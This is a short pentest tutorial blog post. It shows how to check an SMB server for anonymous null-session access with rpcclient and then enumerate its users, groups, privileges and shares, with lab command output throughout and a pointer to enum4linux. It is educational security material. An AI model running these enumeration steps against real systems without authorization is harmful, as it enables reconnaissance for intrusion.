---
title: SMB null session
tags:
- smb
- rpc
---
While performing a pentest, if you discover a server running the [SMB protocol](http://en.wikipedia.org/wiki/Server_Message_Block "Server Message Block"){:class="flashlink" target="_blank"} 
you can test if it's vulnerable to anonymous connection (also called null session) and then glean a lot of informations with 
a [RPC](http://en.wikipedia.org/wiki/Remote_procedure_call "Remote Procedure Call"){:class="flashlink" target="_blank"} client. 
Nmap is usefull to locate that kind of service:

[![smb null session](/images/smb-null-session-1.png)](/images/smb-null-session.png)

Now you can try to interact with the remote machine with the help of [rpcclient](https://www.samba.org/samba/docs/man/manpages/rpcclient.1.html "Man rpcclient"). 
To perform a null session you have to specify an empty user and an empty password. 
If the host is not vulnerable, you will get the following error:

```
$ rpcclient -U "" 192.168.1.31
Enter 's password:
could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED
could not obtain sid for domain WORKGROUP
error: NT_STATUS_ACCESS_DENIED
```

But if the host is vulnerable you will immediatly get a prompt:

```
$ rpcclient -U "" 192.168.1.18
Enter 's password:
rpcclient $>
```

<!--more-->

If you connect successfully, you can use help to see the list of available commands (anyway tab works for autocompletion). 
Below some examples of the most used.

Basic server infos:

```
rpcclient $> srvinfo
  LUIGI          Wk Sv PrQ Unx NT SNT nintendo server
  platform_id     :  500
  os version      :  4.9
  server type     :  0x809a03
```

Users enumeration:

```
rpcclient $> enumdomusers
user:[admin] rid:[0x3ec]
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[lisa] rid:[0x3f1]
user:[mark] rid:[0x3f2]</pre>
```

Groups enumeration:

```
rpcclient $> enumalsgroups builtin
group:[Administrators] rid:[0x220]
group:[Backup Operators] rid:[0x227]
group:[Guests] rid:[0x222]
group:[Power Users] rid:[0x223]
group:[Users] rid:[0x221]
```

Privileges of the connected user:

```
rpcclient $> enumprivs
found 8 privileges

SeMachineAccountPrivilege 		0:6 (0x0:0x6)
SeTakeOwnershipPrivilege 		0:9 (0x0:0x9)
SeBackupPrivilege 		0:17 (0x0:0x11)
SeRestorePrivilege 		0:18 (0x0:0x12)
SeRemoteShutdownPrivilege 		0:24 (0x0:0x18)
SePrintOperatorPrivilege 		0:4097 (0x0:0x1001)
SeAddUsersPrivilege 		0:4098 (0x0:0x1002)
SeDiskOperatorPrivilege 		0:4099 (0x0:0x1003)
```

Shares enumeration:

```
rpcclient $> netshareenum
netname: IPC$
  remark:	IPC Service
  path:	C:\tmp
  password:
netname: Lisa Share
  remark:	Lisa Docs
  path:	C:\home\lisa\files
  password:
```

[enum4linux](https://code.google.com/p/phillips321/){:class="flashlink" target="_blank"} is the perfect tool to automate null session attacks. 
According to the documentation : "[...] this script is basically just a wrapper around rpcclient, net, nmblookup and smbclient [...]".
